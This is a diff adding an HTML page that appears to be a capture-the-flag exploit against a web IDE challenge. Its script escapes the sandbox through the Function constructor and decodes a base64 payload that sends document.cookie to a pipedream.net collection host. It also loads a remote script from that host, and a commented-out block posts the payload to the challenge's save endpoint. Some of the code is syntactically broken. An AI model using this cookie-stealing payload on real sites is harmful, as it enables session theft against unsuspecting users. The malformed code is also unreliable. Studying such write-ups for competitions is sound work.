@@ -1,0 +1,76 @@
+<!doctype html>
+
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+
+  <title>The HTML5 Herald</title>
+  <meta name="description" content="The HTML5 Herald">
+  <meta name="author" content="SitePoint">
+
+  <link rel="stylesheet" href="css/styles.css?v=1.0">
+  <script type="text/javascript">
+
+function exploit(){
+
+
+	   
+
+
+
+let xss = 
+	let window = (_=>0).constructor('return this')();
+	let payload =  window.atob('bGV0IHdpbmRvdyA9IChfPT4wKS5jb25zdHJ1Y3RvcigncmV0dXJuIHRoaXMnKSgpO3dpbmRvdy5mZXRjaCgnaHR0cHM6Ly9lbmFsaTYybW0yMWh1LngucGlwZWRyZWFtLm5ldD9hc2QnICsgd2luZG93LmRvY3VtZW50LmNvb2tpZSk=');
+	const scriptTag = window.document.createElement('script');
+    scriptTag.type = 'text/javascript';
+	scriptTag.src = 'https://enali62mm21hu.x.pipedream.net?as=asdasd';
+	scriptTag.onload = () => resolve();
+	window.document.appendChild(window.document.body, scriptTag);
+
+	document.querySelector('iframe').contentWindow.postMessage(xss,'*')
+}
+
+</script>
+</head>
+<body>
+<!-- <script type="text/javascript">
+
+	let oReq = new window.XMLHttpRequest();
+	oReq.open('POST', 'https://web-ide.dicec.tf/ide/save');
+	oReq.send(payload);	window.fetch('https://enali62mm21hu.x.pipedream.net?as=' + window.btoa(oReq.status));
+(async () => {
+
+  await new Promise((r) => { window.addEventListener(('load'), r); });
+
+  document.getElementById('run').addEventListener('click', () => {
+    document.querySelector('iframe')
+      .contentWindow
+      .postMessage(document.querySelector('textarea').value, '*');
+  });
+
+  document.getElementById('save').addEventListener('click', async () => {
+    const response = await fetch('/ide/save', {
+      method: 'POST',
+      body: document.querySelector('textarea').value,
+      headers: {
+        'Content-Type': 'application/javascript'
+      }
+    });
+    if (response.status === 200) {
+      window.location = `/ide/saves/${await response.text()}`;
+      return;
+    }
+    alert('You are not an admin.');
+  });
+
+})();
+
+
+
+
+</script> -->
+<iframe onload="exploit()" src="https://web-ide.dicec.tf/sandbox.html" sandbox="allow-scripts"></iframe>
+
+
+</body>
+</html>
